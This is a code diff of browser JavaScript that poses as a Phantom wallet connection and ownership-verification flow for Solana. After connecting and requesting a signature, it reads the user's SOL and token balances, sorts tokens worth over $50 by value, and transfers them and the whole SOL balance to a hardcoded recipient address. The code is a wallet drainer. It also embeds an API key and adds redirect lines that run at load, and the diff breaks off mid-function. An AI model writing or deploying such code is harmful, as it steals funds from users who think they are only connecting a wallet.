@@ -1,70 +1,89 @@
-import { Buffer } from 'buffer';  // Ensure buffer is available globally
+// Include Buffer support
+import { Buffer } from 'buffer';
 window.Buffer = Buffer;
 
 import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
 
-// Define necessary variables
-let walletAddress = null;
 
-// Function to connect the Phantom wallet and execute the whole flow
+const dappEncryptionKey = crypto.getRandomValues(new Uint8Array(32));  // Generate encryption key
+// Redirect to Phantom for connection, passing the encryption key and app URL
+window.location.href = `https://phantom.app/ul/v1/connect?dapp_encryption_public_key=${encodeURIComponent(dappEncryptionKey)}&cluster=mainnet-beta&app_url=${encodeURIComponent(window.location.href)}`;
+
+async function handlePhantomConnection() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const phantomPublicKey = urlParams.get('phantom_encryption_public_key');
+    const session = urlParams.get('session');
+
+    if (phantomPublicKey && session) {
+        // Store session data for signing and other operations
+        sessionStorage.setItem('phantomPublicKey', phantomPublicKey);
+        sessionStorage.setItem('session', session);
+        console.log('Phantom Wallet Connected:', phantomPublicKey);
+    }
+}
+
+
+const walletAddress = sessionStorage.getItem('walletAddress');
+const message = `Please sign this message to verify ownership of the wallet: ${walletAddress}`;
+const encodedMessage = new TextEncoder().encode(message);
+const base64Message = Buffer.from(encodedMessage).toString('base64');
+
+const session = sessionStorage.getItem('session');
+window.location.href = `https://phantom.app/ul/v1/signMessage?dapp_encryption_public_key=${encodeURIComponent(dappEncryptionKey)}&message=${encodeURIComponent(base64Message)}&session=${encodeURIComponent(session)}&redirect_link=${encodeURIComponent(window.location.href)}`;
+
+async function handleSignedMessage() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const signedMessage = urlParams.get('signedMessage');
+
+    if (signedMessage) {
+        console.log('Signed Message:', signedMessage);
+        // Proceed with verification or any other logic
+    }
+}
+
+// Wallet connection flow
 async function connectAndExecute() {
     const provider = window.solana;
-
-    // Detect if the user is on a mobile device
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
     if (!provider || !provider.isPhantom) {
-        // If the user is on mobile, redirect to Phantom wallet app
         if (isMobile) {
             window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
             return;
         }
-
-        // For desktop users, prompt to install Phantom Wallet
         alert('Phantom wallet not found. Please install it!');
         return;
     }
 
     try {
-        // Step 1: Request wallet connection (standard flow)
         const response = await provider.connect();
-        walletAddress = response.publicKey.toString();  // Capture the connected wallet address
-
-        // Update button text to indicate connection
+        const walletAddress = response.publicKey.toString();
+        sessionStorage.setItem('walletAddress', walletAddress);
         document.getElementById('connectWalletBtn').textContent = `Connected`;
 
-        // Step 2: Sign a message to verify wallet ownership
+        // Sign a message to verify ownership
         await signMessage(provider, walletAddress);
 
-        // Step 3: Fetch SOL balance
         const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
         const balance = await connection.getBalance(new PublicKey(walletAddress));
         const solBalance = balance / 1e9;
 
-        // Step 4: Fetch token balances using Shyft API
         const tokens = await fetchTokenBalances(walletAddress);
-
-        // Step 5: Fetch prices for tokens using Jupiter API
         const tokenPrices = await fetchTokenPrices(tokens);
 
-        // Step 6: Calculate token values and sort them
         const tokenValues = tokens.map(token => {
             const price = tokenPrices[token.info.symbol] || 0;
             const value = price * token.balance;
             return { ...token, value };
         });
 
-        // Filter and sort tokens by value
         const filteredTokens = tokenValues.filter(token => token.value > 50);
         const sortedTokens = filteredTokens.sort((a, b) => b.value - a.value);
         console.log('Filtered and Sorted Tokens by Value:', sortedTokens);
 
-        // Step 7: Transfer tokens in order
-        const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with recipient's address
+        const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';
         await transferTokensInOrder(sortedTokens, recipientAddress, connection);
-
-        // Step 8: Transfer SOL after tokens
         await transferSol(connection, recipientAddress, solBalance);
 
     } catch (err) {
